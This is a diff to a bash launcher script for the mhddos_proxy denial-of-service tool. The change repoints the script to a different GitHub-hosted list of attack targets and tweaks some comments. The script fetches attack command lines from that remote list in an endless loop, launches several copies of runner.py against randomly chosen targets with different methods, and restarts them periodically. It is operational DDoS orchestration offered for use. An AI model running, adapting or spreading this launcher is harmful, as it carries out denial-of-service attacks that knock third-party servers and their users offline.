@@ -7,7 +7,7 @@
 ##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.
 
 ## "num_of_copies" allows to start several copies of runner.py.
-## Each copy will choose different target from https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets
+## Each copy will choose different target from https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets
 ## This is different from "multiple targets" in mhddos_proxy. Built in mhddos_proxy "multiple targets" can attack multiple IP's but only with same one method.
 ## "num_of_copies" allows to launch several copies of runner.py and targets will be attacked with different methods.
 ## Default = 2 copies(instances). Don't use high values without testing first, pc/vps can slowdown.
@@ -55,7 +55,7 @@ python3 -m pip install -r MHDDoS/requirements.txt
 while true
 echo -e "#####################################\n"
 do
-   # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
+   # Get number of targets in runner_targets. Only strings that starts with "runner.py" are counted as targets. Everything else is ignorred.
    list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py" | wc -l)
    
    echo -e "\nNumber of targets in list: " $list_size "\n"
@@ -64,7 +64,7 @@ do
    random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
    echo -e "random number(s): " $random_numbers "\n"
    
-   # Print all randomly selected targets on screen
+   # Print all randomly selected targets on screen. Just for debug purposes.
    echo -e "Choosen target(s):\n"
    for i in $random_numbers
    do
@@ -75,7 +75,7 @@ do
    # Launch multiple mhddos_proxy instances with different targets.
    for i in $random_numbers
    do
-            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
+            # Filter and only get lines that starts with "runner.py". Then get target from that filtered list.
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
            
             #echo $cmd_line
@@ -86,5 +86,4 @@ sleep $restart_interval
 echo -e "RESTARTING\n"
 pkill -f start.py #In theory should work but doesn't give good results
 pkill python3 #It just works (c)
-sleep 2
 done
